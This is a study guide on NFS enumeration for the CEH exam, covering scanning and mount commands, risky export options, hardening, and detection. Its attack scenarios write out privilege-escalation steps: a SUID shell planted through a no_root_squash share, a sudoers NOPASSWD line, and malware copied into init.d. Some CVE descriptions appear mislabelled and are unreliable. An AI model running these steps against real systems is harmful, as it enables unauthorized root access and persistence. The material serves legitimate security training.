# NFS Enumeration

## Definition

NFS (Network File System) Enumeration is the process of gathering information about NFS shares, mount points, and access permissions on target systems. NFS operates primarily on ports 111 (portmapper/rpcbind) and 2049 (NFS daemon), along with various RPC services. Attackers can exploit NFS misconfigurations to access sensitive files, escalate privileges, or gain unauthorized system access through improperly secured network file shares.

## How NFS Enumeration Works

### Basic Process:
1. **Port Discovery** identifies RPC and NFS services (ports 111, 2049)
2. **RPC Service Enumeration** queries portmapper for available services
3. **NFS Share Discovery** identifies exported file systems and mount points
4. **Permission Analysis** evaluates access controls and mount options
5. **Content Exploration** examines accessible directories and files
6. **Vulnerability Assessment** identifies misconfigurations and security weaknesses

### NFS Architecture:
- **Portmapper/RPCbind**: Service registration and discovery (port 111)
- **NFS Daemon**: Core file system service (port 2049)
- **Mount Daemon**: Handles mount requests and export list
- **Lock Manager**: File locking coordination
- **Status Monitor**: Client status tracking and recovery

## NFS Versions and Features

| Version | Features | Security | Usage |
|---------|----------|----------|-------|
| NFSv2 | Basic file operations | Minimal security | Legacy systems |
| NFSv3 | 64-bit file sizes, async writes | AUTH_SYS only | Common deployment |
| NFSv4 | Stateful, integrated security | Kerberos, ACLs | Modern standard |
| NFSv4.1 | Parallel NFS, sessions | Enhanced security | High-performance |

## Tools and Commands

### Nmap NFS Enumeration
```bash
# NFS service discovery
nmap -p 111,2049 target_ip

# RPC service enumeration
nmap -sS -p 111 --script rpc-grind target_ip

# NFS share enumeration
nmap -p 111 --script nfs-ls target_ip
nmap -p 111 --script nfs-showmount target_ip
nmap -p 111 --script nfs-statfs target_ip

# Comprehensive NFS scanning
nmap -p 111,2049 --script nfs* target_ip
```

### RPC and NFS Commands
```bash
# RPC service discovery
rpcinfo -p target_ip

# Available RPC programs
rpcinfo -T tcp target_ip

# NFS export list
showmount -e target_ip

# All mount information
showmount -a target_ip

# Directories mounted by clients
showmount -d target_ip
```

### Manual NFS Mounting
```bash
# Create mount point
mkdir /tmp/nfs_mount

# Mount NFS share
mount -t nfs target_ip:/shared/path /tmp/nfs_mount

# Mount with specific options
mount -t nfs -o vers=3,tcp target_ip:/export /tmp/mount

# List mounted NFS shares
mount | grep nfs

# Unmount NFS share
umount /tmp/nfs_mount
```

## NFS Export Configuration

### Export Syntax:
```
/path/to/export client_specification(options)
```

### Common Export Options:
- **rw**: Read-write access
- **ro**: Read-only access
- **no_root_squash**: Root user maintains privileges
- **root_squash**: Map root to anonymous user
- **all_squash**: Map all users to anonymous
- **sync**: Synchronous writes
- **async**: Asynchronous writes
- **secure**: Require privileged ports
- **insecure**: Allow non-privileged ports

### Client Specifications:
- **IP Address**: 192.168.1.100
- **Network Range**: 192.168.1.0/24
- **Hostname**: client.example.com
- **Domain**: *.example.com
- **Wildcard**: * (all hosts)

## Enumeration Techniques

### Service Discovery:
```bash
# TCP port scan for RPC services
nmap -sS -p 111,2049,32765-32769 target_ip

# UDP scan for RPC services
nmap -sU -p 111,2049 target_ip

# Version detection
nmap -sV -p 111,2049 target_ip
```

### Share Enumeration:
```bash
# Export list with verbose output
showmount -e -v target_ip

# RPC program information
rpcinfo -p target_ip | grep -E "(nfs|mount|portmap)"

# NFS statistics and information
nfsstat -c target_ip
```

### Permission Testing:
```bash
# Test mount with different options
mount -t nfs -o vers=2 target_ip:/export /mnt/test
mount -t nfs -o vers=3 target_ip:/export /mnt/test
mount -t nfs -o vers=4 target_ip:/export /mnt/test

# Test file operations
touch /mnt/test/testfile
echo "test" > /mnt/test/testfile
rm /mnt/test/testfile
```

## Security Vulnerabilities

### Common Misconfigurations:
- **World-Writable Exports**: Unrestricted write access
- **No_root_squash**: Root privilege preservation
- **Wildcard Exports**: Overly permissive client access
- **Weak Authentication**: Reliance on IP-based authentication
- **Unencrypted Traffic**: Clear-text data transmission

### Attack Vectors:
- **Unauthorized Access**: Mounting restricted shares
- **Privilege Escalation**: Exploiting no_root_squash
- **Data Theft**: Accessing sensitive files
- **System Compromise**: Writing to system directories
- **Lateral Movement**: Using NFS as attack pivot

### Known Vulnerabilities:
- **CVE-2019-3689**: nfs-utils information disclosure
- **CVE-2020-25215**: NFSv4 access control bypass
- **CVE-2021-20317**: NFSv4 security label handling
- **CVE-2022-27666**: NFS kernel buffer overflow

## Response Analysis

### Successful Enumeration:
```
RPC Services:
- 100000 (portmapper) version 4 TCP port 111
- 100005 (mountd) version 3 TCP port 32769
- 100003 (nfs) version 3 TCP port 2049

NFS Exports:
/home/shared 192.168.1.0/24(rw,sync,no_root_squash)
/var/www *(ro,sync,root_squash)
/backup 192.168.1.100(rw,async,all_squash)
```

### Restricted Access:
```
showmount: clnt_create: RPC: Port mapper failure
Mount denied: Access restricted
Export list: Permission denied
RPC: Authentication error
```

### Vulnerable Configuration:
```
/sensitive *(rw,no_root_squash,insecure)
/etc *(rw,sync,no_root_squash)
/root 192.168.1.0/24(rw,no_root_squash)
```

## System Response Behaviors

### Linux NFS Servers:
- **nfs-kernel-server**: Standard Linux NFS implementation
- **Configuration**: /etc/exports file defines shares
- **Security**: iptables and TCP wrappers integration
- **Logging**: System logs track mount attempts and access

### Unix Systems:
- **Solaris**: Native NFS with ZFS integration
- **AIX**: IBM NFS implementation with LDAP integration
- **HP-UX**: Traditional Unix NFS with access control
- **BSD**: FreeBSD/OpenBSD NFS implementations

### Network Appliances:
- **NetApp**: Enterprise NFS with advanced security
- **EMC**: High-performance NFS solutions
- **Synology**: NAS devices with NFS support
- **QNAP**: SMB/NFS hybrid solutions

## Attack Scenarios

### Information Disclosure:
```bash
# Mount accessible shares
mount -t nfs target:/home/shared /mnt/shared

# Search for sensitive files
find /mnt/shared -name "*.conf" -o -name "*.key" -o -name "*password*"

# Extract configuration files
cp /mnt/shared/app/config/database.conf /tmp/
```

### Privilege Escalation:
```bash
# Exploit no_root_squash
mount -t nfs target:/root /mnt/root

# Create SUID shell
cp /bin/bash /mnt/root/shell
chmod +s /mnt/root/shell

# Access as root on target system
ssh user@target
/root/shell -p
```

### File System Manipulation:
```bash
# Write to system directories
mount -t nfs target:/etc /mnt/etc

# Modify critical files
echo "attacker ALL=(ALL) NOPASSWD:ALL" >> /mnt/etc/sudoers

# Plant malicious files
cp malware.sh /mnt/etc/init.d/
```

## Defensive Measures

### Secure Export Configuration:
```
# Example secure exports
/home/public 192.168.1.0/24(ro,sync,root_squash,secure)
/shared/data trusted_host(rw,sync,root_squash,secure)
/backup 192.168.1.100(rw,async,all_squash,secure)
```

### Access Controls:
- **Host-based Restrictions**: Limit client access by IP/hostname
- **Authentication**: Implement Kerberos for NFSv4
- **Encryption**: Use NFSv4 with security flavors
- **Firewall Rules**: Restrict RPC and NFS ports
- **TCP Wrappers**: Additional access control layer

### Monitoring and Logging:
```bash
# Monitor NFS access
tail -f /var/log/syslog | grep nfs

# RPC service monitoring
netstat -ln | grep :111
ss -tulpn | grep rpc

# Export verification
exportfs -v
```

## Detection Methods

### Network Monitoring:
- **Port Scanning Detection**: Monitor for RPC service probes
- **Mount Attempt Logging**: Track unauthorized mount requests
- **Traffic Analysis**: Unusual NFS traffic patterns
- **Connection Monitoring**: Unexpected client connections

### System Monitoring:
- **File Access Logs**: Monitor exported directory access
- **Process Monitoring**: Track NFS daemon activity
- **User Activity**: Unusual file operations on shares
- **Security Events**: Authentication failures and access denials

## Mitigation Strategies

### Configuration Hardening:
```
# Secure export examples
/data 192.168.1.0/24(ro,sync,root_squash,secure,subtree_check)
/apps trusted.example.com(rw,sync,root_squash,secure)

# Disable dangerous options
# Never use: no_root_squash, insecure, no_subtree_check globally
```

### Network Security:
```bash
# Firewall rules for NFS
iptables -A INPUT -p tcp --dport 111 -s 192.168.1.0/24 -j ACCEPT
iptables -A INPUT -p tcp --dport 2049 -s 192.168.1.0/24 -j ACCEPT
iptables -A INPUT -p tcp --dport 111 -j DROP
iptables -A INPUT -p tcp --dport 2049 -j DROP
```

### Authentication and Encryption:
- **NFSv4 with Kerberos**: Strong authentication
- **IPSec**: Network-layer encryption
- **VPN Access**: Secure tunneling for remote access
- **Certificate-based Authentication**: PKI integration

## Practical Applications

### Penetration Testing:
- **Service Discovery**: Identify NFS services in target networks
- **Share Enumeration**: Map accessible file systems
- **Permission Testing**: Evaluate export security
- **Data Extraction**: Access sensitive information
- **Privilege Escalation**: Exploit misconfigurations

### Security Assessment:
- **Configuration Review**: Evaluate export security
- **Access Control Testing**: Verify permission restrictions
- **Vulnerability Scanning**: Automated NFS security testing
- **Compliance Checking**: Ensure security policy adherence

## CEH Exam Focus Points

- Understand NFS architecture and enumeration methodology
- Know key enumeration tools (showmount, rpcinfo, nmap scripts)
- Recognize dangerous export options (no_root_squash, wildcards)
- Be familiar with NFS security vulnerabilities and attack vectors
- Understand the relationship between RPC services and NFS
- Know how to mount and explore NFS shares for reconnaissance
- Recognize proper NFS hardening and security configurations
